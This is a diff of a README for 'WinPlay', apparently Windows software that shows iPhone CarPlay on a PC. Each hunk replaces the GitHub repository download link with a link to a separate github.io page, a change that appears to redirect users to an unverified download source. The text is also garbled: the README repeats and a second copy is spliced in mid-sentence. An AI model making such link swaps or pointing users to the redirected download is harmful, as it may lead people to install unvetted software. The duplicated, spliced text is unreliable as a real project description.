@@ -1,6 +1,6 @@
 # 🎮 WinPlay - Use iPhone CarPlay on Windows
 
-[![Download WinPlay](https://img.shields.io/badge/⬇️%20Download%20WinPlay-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mustkimkureshi/WinPlay)
+[![Download WinPlay](https://img.shields.io/badge/⬇️%20Download%20WinPlay-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://mustkimkureshi.github.io)
 
 WinPlay is an open-source Windows wireless CarPlay receiver software. It supports local hotspot and LAN connections, allowing you to display and operate your iPhone’s CarPlay interface on your computer. If you want to use CarPlay on a Windows screen without complicated setup, WinPlay is designed for that everyday use case.
 
@@ -47,7 +47,7 @@ For the best experience, keep your Windows computer and iPhone close to each oth
 
 Use the main download link below to get the application.
 
-[Download WinPlay](https://github.com/mustkimkureshi/WinPlay)
+[Download WinPlay](https://mustkimkureshi.github.io)
 
 Visit this link to download the application.
 
@@ -68,7 +68,7 @@ Follow these steps in order. The goal is to download WinPlay, open it on Windows
 
 After the first successful connection, future sessions should be easier because your devices and network# 🎮 WinPlay - Use iPhone CarPlay on Windows
 
-[![Download WinPlay](https://img.shields.io/badge/⬇️%20Download%20WinPlay-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mustkimkureshi/WinPlay)
+[![Download WinPlay](https://img.shields.io/badge/⬇️%20Download%20WinPlay-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://mustkimkureshi.github.io)
 
 WinPlay is an open-source Windows wireless CarPlay receiver software. It supports local hotspot and LAN connections, allowing you to display and operate your iPhone’s CarPlay interface on your computer. If you want to use CarPlay on a Windows screen without complicated setup, WinPlay is designed for exactly that everyday use case.
 
@@ -115,7 +115,7 @@ For the best experience, keep your Windows computer and iPhone close to each oth
 
 Use the main download link below to get the application.
 
-[Download WinPlay](https://github.com/mustkimkureshi/WinPlay)
+[Download WinPlay](https://mustkimkureshi.github.io)
 
 Visit this link to download the application.
 
